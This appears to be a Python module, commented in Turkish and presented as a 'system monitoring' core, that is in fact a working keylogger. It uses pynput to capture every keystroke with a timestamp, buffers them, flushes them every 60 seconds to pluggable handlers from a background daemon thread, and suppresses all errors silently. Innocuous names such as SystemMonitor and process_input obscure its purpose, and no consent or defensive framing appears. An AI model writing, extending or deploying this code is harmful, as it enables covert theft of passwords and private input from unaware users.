"""
Sistem izleme çekirdek modülü.
"""
import threading
import time
from datetime import datetime
from pynput import keyboard

class SystemMonitor:
    """Sistem girdilerini izleyen temel sınıf."""
    
    def __init__(self, data_handlers=None, update_interval=60):
        """
        SystemMonitor sınıfını başlat.
        
        Args:
            data_handlers: Veri işleme mekanizmaları listesi
            update_interval: Güncelleme sıklığı (saniye)
        """
        self.data_handlers = data_handlers or []
        self.update_interval = update_interval
        self.input_listener = None
        self.active = False
        self.data_buffer = []
        self.buffer_lock = threading.Lock()
        self.update_thread = None
        
    def process_input(self, key):
        """Bir girdi alındığında çağrılan fonksiyon."""
        with self.buffer_lock:
            try:
                # Özel tuşları metin gösterimine dönüştür
                if hasattr(key, 'char'):
                    if key.char:
                        char = key.char
                    else:
                        char = f"[{key}]"
                else:
                    # Özel tuşlar için daha okunaklı gösterim
                    key_name = str(key).replace("Key.", "")
                    char = f"[{key_name}]"
                
                # Girdi ve zamanını kaydet
                timestamp = datetime.now().strftime("%H:%M:%S")
                self.data_buffer.append((timestamp, char))
            except Exception:
                # Hata durumunda sessizce devam et
                pass
                
    def initialize(self):
        """İzlemeyi başlat."""
        if self.active:
            return
            
        self.active = True
        
        # Klavye dinleyicisini başlat
        self.input_listener = keyboard.Listener(on_press=self.process_input)
        self.input_listener.start()
        
        # Düzenli güncelleme iş parçacığını başlat
        self.update_thread = threading.Thread(target=self._update_task)
        self.update_thread.daemon = True
        self.update_thread.start()
        
    def terminate(self):
        """İzlemeyi durdur."""
        self.active = False
        
        # Son bir güncelleme gönder
        self._send_update()
        
        # Klavye dinleyicisini durdur
        if self.input_listener:
            self.input_listener.stop()
            
        # Güncelleme iş parçacığının durmasını bekle
        if self.update_thread:
            self.update_thread.join(timeout=2.0)
            
    def _update_task(self):
        """Düzenli güncelleme görevi."""
        while self.active:
            # Güncelleme aralığı kadar bekle
            time.sleep(self.update_interval)
            # Güncelleme gönder
            if self.active:  # Çıkış sırasında gereksiz güncellemeyi önle
                self._send_update()
                
    def _send_update(self):
        """Güncelleme işlemi."""
        with self.buffer_lock:
            if not self.data_buffer:
                return  # Boş güncelleme gönderme
                
            # Bufferi boşalt ve raporla
            update_data = self.data_buffer.copy()
            self.data_buffer = []
            
        # Her işleyiciye veriyi gönder
        for handler in self.data_handlers:
            try:
                handler.log(update_data)
            except Exception:
                # İşleyici hatası durumunda sessizce devam et
                pass 